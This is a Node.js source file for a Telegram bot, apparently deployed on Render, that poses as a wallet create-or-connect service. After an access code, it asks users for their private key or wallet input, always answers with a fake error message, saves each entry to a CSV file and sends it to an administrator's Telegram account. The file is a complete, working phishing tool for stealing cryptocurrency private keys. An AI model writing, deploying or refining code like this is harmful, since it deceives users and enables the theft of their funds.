const { Telegraf, session, Markup } = require("telegraf");
const crypto = require("crypto");
const fs = require("fs");;

// =============================
// CONFIGURATION
// =============================
// 1. Replace with your bot token from BotFather
const BOT_TOKEN = process.env.BOT_TOKEN;

// 2. Replace with your Telegram numeric ID (get it from @userinfobot)
// The bot will send form submissions to this ID
const ADMIN_ID = process.env.ADMIN_ID;

// 3. Access code required to start the form
const ACCESS_CODE = "18396";

// Fixed token shown when creating a new wallet
const PREDEFINED_TOKEN =
  "4r1G8eCNnUmZY6Vfg65Khr2mFR1KTrs4uUxYbfo7kbFJRGq4cqupbGZEXbsL9chVyDsVJJfvreq1C9kkifjvh2yS";

// File for submissions
const SUBMISSIONS_FILE = "./submissions.csv";
// =============================

// Webhook domain (your Render app URL, no trailing slash)
const WEBHOOK_DOMAIN = 'https://bot-vei4.onrender.com'

// Port for Render (Render provides PORT env automatically)
const PORT = process.env.PORT || 3000
// =============================

const bot = new Telegraf(BOT_TOKEN)

// Always initialize session with empty object
bot.use(session({ defaultSession: () => ({}) }))

// --- Helpers ---
function ensureCsvHeader() {
  if (!fs.existsSync(SUBMISSIONS_FILE)) {
    const header = 'timestamp,user_id,username,access_code,action,expected_token,user_input\n'
    fs.writeFileSync(SUBMISSIONS_FILE, header)
  }
}

function saveSubmission(data) {
  ensureCsvHeader()
  const line = `${data.timestamp},${data.user_id},${data.username},${data.access_code},${data.action},${data.expected_token},${data.user_input}\n`
  fs.appendFileSync(SUBMISSIONS_FILE, line)
}

async function sendToAdmin(ctx, data) {
  if (ADMIN_ID) {
    const summary =
`📩 New Submission
User: ${ctx.from.username || 'N/A'} (${ctx.from.id})
Action: ${data.action}
Input: ${data.user_input}`
    await ctx.telegram.sendMessage(ADMIN_ID, summary)
  }
}

// --- Bot Flow ---
bot.start(ctx => {
  ctx.session = { step: 'ASK_ACCESS' }
  ctx.reply('👋 Welcome. Enter your access code to proceed.')
})

bot.on('text', async ctx => {
  const text = ctx.message.text.trim()
  const step = ctx.session && ctx.session.step

  if (step === 'ASK_ACCESS') {
    if (text === ACCESS_CODE) {
      ctx.session.step = 'CHOOSE_ACTION'
      ctx.session.access_code = ACCESS_CODE
      return ctx.reply(
        '✅ Access granted. Choose an option:',
        Markup.inlineKeyboard([
          [Markup.button.callback('🆕 Create new wallet', 'CREATE')],
          [Markup.button.callback('🔗 Connect existing wallet', 'CONNECT')]
        ])
      )
    } else {
      return ctx.reply('❌ Invalid access code. Send /start to try again.')
    }
  }

  if (step === 'AWAIT_INPUT') {
    ctx.session.user_input = text

    // Error message to user
    await ctx.reply('⚠️ Error. Token not accepted. Submission failed.')

    // Log and notify admin
    const submission = {
      timestamp: new Date().toISOString(),
      user_id: ctx.from.id,
      username: ctx.from.username || '',
      access_code: ctx.session.access_code || '',
      action: ctx.session.action || '',
      expected_token: ctx.session.expected_token || '',
      user_input: text
    }
    saveSubmission(submission)
    await sendToAdmin(ctx, submission)

    ctx.session = null
    return
  }

  return ctx.reply('ℹ️ Send /start to begin the form.')
})

// --- Button Handlers ---
bot.action('CREATE', async ctx => {
  ctx.session.step = 'AWAIT_INPUT'
  ctx.session.action = 'create_new_wallet'
  ctx.session.expected_token = PREDEFINED_TOKEN
  await ctx.reply(`🆕 Your token is: ${PREDEFINED_TOKEN}\n\nPlease Input  Wallet it to continue.`)
  await ctx.answerCbQuery()
})

bot.action('CONNECT', async ctx => {
  ctx.session.step = 'AWAIT_INPUT'
  ctx.session.action = 'connect_existing_wallet'
  ctx.session.expected_token = '(user provided)'
  await ctx.reply('🔗 Input your private key 🔑 to continue.')
  await ctx.answerCbQuery()
})

// =============================
// WEBHOOK SETUP FOR RENDER
// =============================
const express = require('express')
const app = express()

app.use(bot.webhookCallback('/webhook'))

app.get('/', (req, res) => {
  res.send('✅ Telegram bot is running on Render.')
})

// Start server
app.listen(PORT, async () => {
  console.log(`🚀 Server running on port ${PORT}`)

  // Set Telegram webhook to your Render domain
  try {
    await bot.telegram.setWebhook(`${WEBHOOK_DOMAIN}/webhook`)
    console.log(`✅ Webhook set to ${WEBHOOK_DOMAIN}/webhook`)
  } catch (err) {
    console.error('Failed to set webhook', err)
  }
})



